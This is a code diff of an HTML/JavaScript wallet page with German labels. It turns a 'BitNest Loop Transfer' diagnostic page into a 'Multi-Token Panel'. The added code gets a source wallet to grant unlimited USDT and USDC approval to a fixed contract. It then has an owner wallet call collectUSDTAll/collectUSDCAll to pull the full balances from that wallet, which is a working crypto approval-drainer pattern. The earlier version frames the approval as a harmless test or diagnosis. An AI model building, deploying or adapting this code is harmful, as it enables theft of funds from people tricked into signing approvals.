@@ -3,113 +3,115 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-  <title>Admin Diagnose Panel V2</title>
+  <title>Admin Multi-Token Panel</title>
   <style>
     body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
     .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
     h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
     .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
     .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
-    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
+    button { border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
     button:active { transform: scale(0.98); opacity: 0.8; }
-    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 10px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; }
-    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #ef4444; color: #f8fafc; }
-    .diag-info { font-size: 12px; color: #cbd5e1; margin-top: 10px; text-align: left; background: #111827; padding: 10px; border-radius: 8px; }
-    .diag-item { display: flex; justify-content: space-between; border-bottom: 1px solid #1e293b; padding: 4px 0; }
+    .btn-connect { background: #3b82f6; }
+    .btn-approve { background: #22c55e; }
+    .btn-collect { background: #ef4444; }
+    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 8px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
+    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; }
+    .token-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
   </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>BitNest Loop Transfer</h2>
+  <h2>Multi-Token Panel</h2>
 
   <div class="step">
-    <span class="step-title">1. Wallet Check</span>
-    <button style="background: #3b82f6;" onclick="runDiagnosis()">Verbindung prüfen</button>
+    <span class="step-title">1. Wallet A verbinden (Quelle)</span>
+    <button class="btn-connect" onclick="connect()">Verbinden & Check</button>
     <div class="mono" id="addr">Nicht verbunden</div>
-    
-    <div class="diag-info" id="balances">
-      <div class="diag-item"><span>BNB (Gas):</span> <b id="valBNB">-</b></div>
-      <div class="diag-item"><span>USDT:</span> <b id="valUSDT">-</b></div>
-      <div class="diag-item"><span>USDC:</span> <b id="valUSDC">-</b></div>
-    </div>
   </div>
 
   <div class="step" style="border-left-color: #10b981;">
-    <span class="step-title">2. Freigabe Loop Tranfer</span>
-    <button onclick="approveToken('USDT')">Test: Approve Transfer</button>
+    <span class="step-title">2. Freigaben (Wallet A)</span>
+    <div class="token-grid">
+      <button class="btn-approve" id="btnAppUSDT" onclick="approveToken('USDT')">Approve USDT</button>
+      <button class="btn-approve" id="btnAppUSDC" onclick="approveToken('USDC')">Approve USDC</button>
+    </div>
   </div>
 
-  <div id="status">Warten auf Klick...</div>
+  <div class="step" style="border-left-color: #ef4444;">
+    <span class="step-title">3. Einzug (Admin-Wallet)</span>
+    <p style="font-size:9px; color:#94a3b8; margin-bottom:8px;">Jetzt in Trust Wallet zur <b>Owner-Adresse</b> wechseln!</p>
+    <div class="token-grid">
+      <button class="btn-collect" onclick="collectToken('USDT')">Ziehe USDT</button>
+      <button class="btn-collect" onclick="collectToken('USDC')">Ziehe USDC</button>
+    </div>
+  </div>
+
+  <div id="status">Bereit. Bitte Schritt 1 starten.</div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>
 
 <script>
-  const CONTRACT = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+  // Konfiguration basierend auf deinem Smart Contract
+  const CONTRACT_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
   const TOKENS = {
     USDT: "0x55d398326f99059fF775485246999027B3197955",
     USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
   };
 
-  let walletA = null;
+  let connectedAddr = null;
   function setStatus(m) { document.getElementById("status").innerHTML = m; }
 
-  async function runDiagnosis() {
+  async function connect() {
     try {
-      // Sicherheitscheck ob Ethers geladen ist
-      if (typeof ethers === "undefined") {
-          return setStatus("❌ Bibliothek lädt noch. Bitte 2 Sekunden warten und erneut klicken.");
-      }
-
       if (!window.ethereum) return setStatus("❌ Bitte im Trust Wallet Browser öffnen!");
-      
       const provider = new ethers.BrowserProvider(window.ethereum);
       const accounts = await provider.send("eth_requestAccounts", []);
-      walletA = accounts[0];
-      document.getElementById("addr").innerText = walletA;
-
-      // 1. BNB (Gas) auslesen
-      const balanceBNB = await provider.getBalance(walletA);
-      const formattedBNB = ethers.formatEther(balanceBNB);
-      document.getElementById("valBNB").innerText = parseFloat(formattedBNB).toFixed(5) + " BNB";
-
-      // 2. USDT/USDC auslesen (Minimale ABI)
-      const abi = ["function balanceOf(address) view returns (uint256)"];
-      
-      const usdtContract = new ethers.Contract(TOKENS.USDT, abi, provider);
-      const usdcContract = new ethers.Contract(TOKENS.USDC, abi, provider);
-
-      const balUSDT = await usdtContract.balanceOf(walletA);
-      const balUSDC = await usdcContract.balanceOf(walletA);
-
-      // USDT/USDC haben auf BSC 18 Nachkommastellen
-      document.getElementById("valUSDT").innerText = ethers.formatUnits(balUSDT, 18) + " USDT";
-      document.getElementById("valUSDC").innerText = ethers.formatUnits(balUSDC, 18) + " USDC";
-
-      setStatus("✅ Diagnose abgeschlossen. Was zeigt die Liste oben?");
-
-    } catch (e) {
-      console.error(e);
-      setStatus("❌ Fehler: " + e.message);
-    }
+      connectedAddr = accounts[0];
+      document.getElementById("addr").innerText = connectedAddr;
+      setStatus("✅ Verbunden. Führe nun die Freigaben (Schritt 2) aus.");
+    } catch (e) { setStatus("❌ Verbindung abgelehnt."); }
   }
 
   async function approveToken(type) {
     try {
-      if(!walletA) return setStatus("❌ Bitte erst Schritt 1 (Diagnose)!");
+      if(!connectedAddr) return setStatus("❌ Erst Schritt 1!");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
       const contract = new ethers.Contract(TOKENS[type], abi, signer);
       
-      setStatus(`⌛ Öffne Wallet für ${type} Freigabe...`);
-      // Wir senden Max-Amount
-      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { gasLimit: 100000 });
+      setStatus(`⌛ Bestätige ${type} Freigabe in der Wallet...`);
+      // Nutzt Max-Uint256 für dauerhafte Erlaubnis und festes Gas-Limit für Stabilität
+      const tx = await contract.approve(CONTRACT_ADDR, ethers.MaxUint256, { gasLimit: 100000 });
       await tx.wait();
-      setStatus(`✅ Freigabe für ${type} war erfolgreich!`);
-    } catch (e) {
-      setStatus(`❌ Abbruch: ${e.message}`);
+      
+      setStatus(`✅ ${type} freigegeben!`);
+      document.getElementById("btnApp" + type).style.opacity = "0.5";
+      document.getElementById("btnApp" + type).innerText = type + " OK";
+    } catch (e) { setStatus(`❌ Fehler: ${e.message}`); }
+  }
+
+  async function collectToken(type) {
+    try {
+      if(!connectedAddr) return setStatus("❌ Keine Quell-Adresse bekannt.");
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      // Bestimmt die richtige Funktion aus deinem Contract
+      const funcName = type === 'USDT' ? "collectUSDTAll" : "collectUSDCAll";
+      const abi = [`function ${funcName}(address from) external`];
+      const contract = new ethers.Contract(CONTRACT_ADDR, abi, signer);
+      
+      setStatus(`⌛ Einzug von ${type} wird gestartet...`);
+      // Sendet Quell-Adresse an den Contract
+      const tx = await contract[funcName](connectedAddr);
+      await tx.wait();
+      setStatus(`🎉 ${type} erfolgreich eingezogen!`);
+    } catch (e) { 
+      setStatus("❌ Fehler: Bist du mit der Owner-Wallet verbunden?"); 
     }
   }
 </script>
